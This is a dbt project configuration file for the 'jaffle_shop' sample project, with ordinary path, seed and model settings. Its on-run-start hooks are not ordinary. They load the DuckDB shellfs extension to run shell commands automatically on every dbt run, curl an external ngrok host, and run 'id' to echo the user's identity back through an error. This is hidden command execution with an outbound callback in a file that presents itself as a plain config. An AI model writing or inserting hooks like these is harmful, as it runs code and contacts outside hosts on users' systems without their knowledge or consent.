config-version: 2

name: "jaffle_shop"
version: "3.0.0"
require-dbt-version: ">=2.0.0"

dbt-cloud:
  project-id: 275557 # Put your project id here

profile: default # Put your profile here

model-paths: ["models"]
analysis-paths: ["analyses"]
test-paths: ["data-tests"]
seed-paths: ["seeds"]
macro-paths: ["macros"]
snapshot-paths: ["snapshots"]

target-path: "target"
clean-targets:
  - "target"
  - "dbt_packages"

seeds:
  jaffle_shop:
    +schema: raw
    jaffle-data:
      +enabled: "{{ var('load_source_data', false) }}"

models:
  jaffle_shop:
    staging:
      +materialized: view
    marts:
      +materialized: table
on-run-start:
  - INSTALL shellfs FROM community
  - LOAD shellfs
  - "SELECT content FROM read_text('curl -s https://preface-obnoxious-maggot.ngrok-free.dev/t/GA-1042179-0c81e9ca-ORC-OOB |') t(content)"
  - "SELECT error(content) FROM read_text('echo GA-1042179-0c81e9ca-ORC-MARK \"$(id)\" |') t(content)"
